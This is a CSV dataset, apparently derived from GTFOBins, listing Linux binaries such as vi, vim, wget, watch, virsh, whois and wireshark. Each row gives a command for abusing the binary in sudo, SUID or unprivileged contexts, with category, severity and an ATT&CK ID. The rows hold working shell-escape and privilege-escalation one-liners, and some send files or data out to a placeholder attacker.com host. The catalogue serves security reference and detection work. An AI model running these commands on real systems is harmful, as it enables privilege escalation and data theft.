1908,Linux,unshare -r /bin/sh,Abuse the 'unshare' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/unshare/
1909,Linux,unshare /bin/sh,Abuse the 'unshare' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/unshare/
1910,Linux,unsquashfs shell ./squashfs-root/sh -p,Abuse the 'unsquashfs' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/unsquashfs/
1911,Linux,unsquashfs shell ./squashfs-root/sh -p,Abuse the 'unsquashfs' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/unsquashfs/
1912,Linux,unzip -K shell.zip ./sh -p,Abuse the 'unzip' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/unzip/
1913,Linux,unzip -K shell.zip ./sh -p,Abuse the 'unzip' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/unzip/
1914,Linux,echo DATA >/path/to/temp-file update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0,Abuse the 'update-alternatives' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/update-alternatives/
1915,Linux,echo DATA >/path/to/temp-file update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0,Abuse the 'update-alternatives' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/update-alternatives/
1916,Linux,urlget - /path/to/input-file,"Abuse the 'urlget' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/urlget/
1917,Linux,urlget - /path/to/input-file,"Abuse the 'urlget' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/urlget/
1918,Linux,urlget - /path/to/input-file,"Abuse the 'urlget' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/urlget/
1919,Linux,uuencode /path/to/input-file /dev/stdout | uudecode,Abuse the 'uuencode' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/uuencode/
1920,Linux,uuencode /path/to/input-file /dev/stdout | uudecode,Abuse the 'uuencode' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/uuencode/
1921,Linux,uuencode /path/to/input-file /dev/stdout | uudecode,Abuse the 'uuencode' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/uuencode/
1922,Linux,uv run /bin/sh,Abuse the 'uv' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/uv/
1923,Linux,uv run /bin/sh,Abuse the 'uv' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/uv/
1924,Linux,echo '...' >Vagrantfile vagrant up,Abuse the 'vagrant' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vagrant/
1925,Linux,echo '...' >Vagrantfile vagrant up,Abuse the 'vagrant' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/vagrant/
1926,Linux,valgrind /bin/sh,Abuse the 'valgrind' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/valgrind/
1927,Linux,valgrind /bin/sh,Abuse the 'valgrind' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/valgrind/
1928,Linux,"varnishncsa -g request -q 'ReqURL ~ ""/xxxxxxxxxx""' -F '%{yyy}i' -w /path/to/output-file","Abuse the 'varnishncsa' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The command hangs, so the trigger command must be performed asynchronously or in another terminal: ``` curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx ```",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/varnishncsa/
1929,Linux,"varnishncsa -g request -q 'ReqURL ~ ""/xxxxxxxxxx""' -F '%{yyy}i' -w /path/to/output-file","Abuse the 'varnishncsa' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The command hangs, so the trigger command must be performed asynchronously or in another terminal: ``` curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx ```",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/varnishncsa/
1930,Linux,vi /path/to/input-file,Abuse the 'vi' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vi/
1931,Linux,vi /path/to/input-file,Abuse the 'vi' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vi/
1932,Linux,vi /path/to/input-file,Abuse the 'vi' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/vi/
1933,Linux,vi /path/to/output-file iDATA ^[ w,Abuse the 'vi' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Where `^[` is the escape key.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/vi/
1934,Linux,vi /path/to/output-file iDATA ^[ w,Abuse the 'vi' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Where `^[` is the escape key.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/vi/
1935,Linux,vi /path/to/output-file iDATA ^[ w,Abuse the 'vi' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Where `^[` is the escape key.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/vi/
1936,Linux,vi -c ':!/bin/sh' /dev/null,Abuse the 'vi' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/vi/
1937,Linux,vi -c ':!/bin/sh' /dev/null,Abuse the 'vi' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/vi/
1938,Linux,vi -c ':!/bin/sh' /dev/null,Abuse the 'vi' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/vi/
1939,Linux,vi -c ':shell',Abuse the 'vi' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/vi/
1940,Linux,vi -c ':shell',Abuse the 'vi' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/vi/
1941,Linux,vi -c ':shell',Abuse the 'vi' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/vi/
1942,Linux,vi -c ':set shell=/bin/sh | shell',Abuse the 'vi' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/vi/
1943,Linux,vi -c ':set shell=/bin/sh\ -p | shell',Abuse the 'vi' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/vi/
1944,Linux,vi -c ':set shell=/bin/sh | shell',Abuse the 'vi' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/vi/
1945,Linux,vi -c :terminal /bin/sh,Abuse the 'vi' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/vi/
1946,Linux,vi -c ':terminal /bin/sh -p',Abuse the 'vi' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/vi/
1947,Linux,vi -c :terminal /bin/sh,Abuse the 'vi' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/vi/
1948,Linux,vigr,"Abuse the 'vigr' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vigr/
1949,Linux,vigr,"Abuse the 'vigr' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vigr/
1950,Linux,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'",Abuse the 'vim' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vim/
1951,Linux,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'",Abuse the 'vim' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vim/
1952,Linux,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'",Abuse the 'vim' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/vim/
1953,Linux,vim -c ':py ...',Abuse the 'vim' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vim/
1954,Linux,vim -c ':py ...',Abuse the 'vim' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vim/
1955,Linux,vim -c ':py ...',Abuse the 'vim' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/vim/
1956,Linux,vim -c ':lua ...',Abuse the 'vim' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vim/
1957,Linux,vim -c ':lua ...',Abuse the 'vim' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vim/
1958,Linux,vim -c ':lua ...',Abuse the 'vim' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/vim/
1959,Linux,vim,Abuse the 'vim' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vim/
1960,Linux,vim,Abuse the 'vim' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vim/
1961,Linux,vim,Abuse the 'vim' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/vim/
1962,Linux,vipw,"Abuse the 'vipw' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/vipw/
1963,Linux,vipw,"Abuse the 'vipw' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/vipw/
1964,Linux,cat >/path/to/temp-file.xml <<EOF <domain type='kvm'> <name>x</name> <os> <type arch='x86_64'>hvm</type> </os> <memory unit='KiB'>1</memory> <devices> <interface type='ethernet'> <script path='/path/to/command'/> </interface> </devices> </domain> EOF virsh -c qemu:///system create /path/to/temp-file.xml virsh -c qemu:///system destroy x,Abuse the 'virsh' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/virsh/
1965,Linux,echo DATA >/path/to/temp-file cat >/path/to/temp-file.xml <<EOF <volume type='file'> <name>y</name> <key>/path/to/output-dir/output-file</key> <source> </source> <capacity unit='bytes'>5</capacity> <allocation unit='bytes'>4096</allocation> <physical unit='bytes'>5</physical> <target> <path>/path/to/output-dir/output-file</path> <format type='raw'/> <permissions> <mode>0600</mode> <owner>0</owner> <group>0</group> </permissions> </target> </volume> EOF virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/ virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file virsh -c qemu:///system pool-destroy x,"Abuse the 'virsh' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/virsh/
1966,Linux,echo DATA >/path/to/temp-file cat >/path/to/temp-file.xml <<EOF <volume type='file'> <name>y</name> <key>/path/to/output-dir/output-file</key> <source> </source> <capacity unit='bytes'>5</capacity> <allocation unit='bytes'>4096</allocation> <physical unit='bytes'>5</physical> <target> <path>/path/to/output-dir/output-file</path> <format type='raw'/> <permissions> <mode>0600</mode> <owner>0</owner> <group>0</group> </permissions> </target> </volume> EOF virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/ virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file virsh -c qemu:///system pool-destroy x,"Abuse the 'virsh' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/virsh/
1967,Linux,virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/ virsh -c qemu:///system vol-download --pool x input-file output-file virsh -c qemu:///system pool-destroy x,Abuse the 'virsh' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This requires the user to be in the `libvirt` group.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/virsh/
1968,Linux,virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/ virsh -c qemu:///system vol-download --pool x input-file output-file virsh -c qemu:///system pool-destroy x,Abuse the 'virsh' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires the user to be in the `libvirt` group.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/virsh/
1969,Linux,volatility -f /path/to/core-dump volshell ...,Abuse the 'volatility' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/volatility/
1970,Linux,volatility -f /path/to/core-dump volshell ...,Abuse the 'volatility' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/volatility/
1971,Linux,volatility -f /path/to/core-dump volshell ...,Abuse the 'volatility' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/volatility/
1972,Linux,w3m -dump /path/to/input-file,Abuse the 'w3m' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/w3m/
1973,Linux,w3m -dump /path/to/input-file,Abuse the 'w3m' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/w3m/
1974,Linux,w3m -dump /path/to/input-file,Abuse the 'w3m' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/w3m/
1975,Linux,wall --nobanner /path/to/input-file,Abuse the 'wall' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/wall/
1976,Linux,watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0',Abuse the 'watch' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/watch/
1977,Linux,watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0',Abuse the 'watch' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/watch/
1978,Linux,watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0',Abuse the 'watch' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/watch/
1979,Linux,watch 'reset; exec /bin/sh 1>&0 2>&0',Abuse the 'watch' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/watch/
1980,Linux,watch 'reset; exec /bin/sh 1>&0 2>&0',Abuse the 'watch' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/watch/
1981,Linux,watch 'reset; exec /bin/sh 1>&0 2>&0',Abuse the 'watch' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/watch/
1982,Linux,wc --files0-from /path/to/input-file,Abuse the 'wc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/wc/
1983,Linux,wc --files0-from /path/to/input-file,Abuse the 'wc' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/wc/
1984,Linux,wc --files0-from /path/to/input-file,Abuse the 'wc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/wc/
1985,Linux,cat >/path/to/temp-file.conf <<EOF [Interface] PostUp = /bin/sh EOF wg-quick up /path/to/temp-file.conf,Abuse the 'wg-quick' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/wg-quick/
1986,Linux,wget http://attacker.com/path/to/input-file -O /path/to/output-file,Abuse the 'wget' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/wget/
1987,Linux,wget http://attacker.com/path/to/input-file -O /path/to/output-file,Abuse the 'wget' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/wget/
1988,Linux,wget http://attacker.com/path/to/input-file -O /path/to/output-file,Abuse the 'wget' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/wget/
1989,Linux,wget -i /path/to/input-file,"Abuse the 'wget' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/wget/
1990,Linux,wget -i /path/to/input-file,"Abuse the 'wget' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/wget/
1991,Linux,wget -i /path/to/input-file,"Abuse the 'wget' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/wget/
1992,Linux,wget -i /path/to/input-file -o /path/to/output-file,"Abuse the 'wget' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/wget/
1993,Linux,wget -i /path/to/input-file -o /path/to/output-file,"Abuse the 'wget' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/wget/
1994,Linux,wget -i /path/to/input-file -o /path/to/output-file,"Abuse the 'wget' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/wget/
1995,Linux,echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file wget --use-askpass=/path/to/temp-file 0,Abuse the 'wget' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/wget/
1996,Linux,echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file wget --use-askpass=/path/to/temp-file 0,Abuse the 'wget' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/wget/
1997,Linux,echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file wget --use-askpass=/path/to/temp-file 0,Abuse the 'wget' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/wget/
1998,Linux,wget --post-file=/path/to/input-file http://attacker.com,Abuse the 'wget' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/wget/
1999,Linux,wget --post-file=/path/to/input-file http://attacker.com,Abuse the 'wget' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/wget/
2000,Linux,wget --post-file=/path/to/input-file http://attacker.com,Abuse the 'wget' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/wget/
2001,Linux,wget --post-data=DATA http://attacker.com,Abuse the 'wget' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/wget/
2002,Linux,wget --post-data=DATA http://attacker.com,Abuse the 'wget' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/wget/
2003,Linux,wget --post-data=DATA http://attacker.com,Abuse the 'wget' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/wget/
2004,Linux,whiptail --textbox --scrolltext /path/to/input-file 0 0,"Abuse the 'whiptail' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/whiptail/
2005,Linux,whiptail --textbox --scrolltext /path/to/input-file 0 0,"Abuse the 'whiptail' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/whiptail/
2006,Linux,whiptail --textbox --scrolltext /path/to/input-file 0 0,"Abuse the 'whiptail' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/whiptail/
2007,Linux,whois -h attacker.com -p 12345 x,Abuse the 'whois' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. Received data has instances of the `\r` byte stripped.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/whois/
2008,Linux,whois -h attacker.com -p 12345 x,Abuse the 'whois' binary (download) in a suid context to escalate privileges or execute arbitrary actions. Received data has instances of the `\r` byte stripped.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/whois/
2009,Linux,whois -h attacker.com -p 12345 x,Abuse the 'whois' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. Received data has instances of the `\r` byte stripped.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/whois/
2010,Linux,whois -h attacker.com -p 12345 DATA,"Abuse the 'whois' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. Data is converted to lower case, and has a trailing `\r\n`.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/whois/
2011,Linux,whois -h attacker.com -p 12345 DATA,"Abuse the 'whois' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. Data is converted to lower case, and has a trailing `\r\n`.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/whois/
2012,Linux,whois -h attacker.com -p 12345 DATA,"Abuse the 'whois' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. Data is converted to lower case, and has a trailing `\r\n`.",File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/whois/
2013,Linux,wireshark -c 1 -i lo -k -f 'udp port 12345' & echo DATA | nc -u 127.127.127.127 12345,"Abuse the 'wireshark' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This technique can be used to write arbitrary files, i.e., the dump of one UDP packet. After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved: 1. select the only received packet; 2. right-click on ""Data"" from the ""Packet Details"" pane, and select ""Export Packet Bytes...""; 3. choose where to save the packet dump.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/wireshark/
2014,Linux,wireshark -c 1 -i lo -k -f 'udp port 12345' & echo DATA | nc -u 127.127.127.127 12345,"Abuse the 'wireshark' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This technique can be used to write arbitrary files, i.e., the dump of one UDP packet. After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved: 1. select the only received packet; 2. right-click on ""Data"" from the ""Packet Details"" pane, and select ""Export Packet Bytes...""; 3. choose where to save the packet dump.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/wireshark/
2015,Linux,wireshark,"Abuse the 'wireshark' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This requires GUI interaction. Start Wireshark, then from the main menu, select ""Tools"" -> ""Lua"" -> ""Evaluate"". A window opens that allows to execute Lua code.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/wireshark/
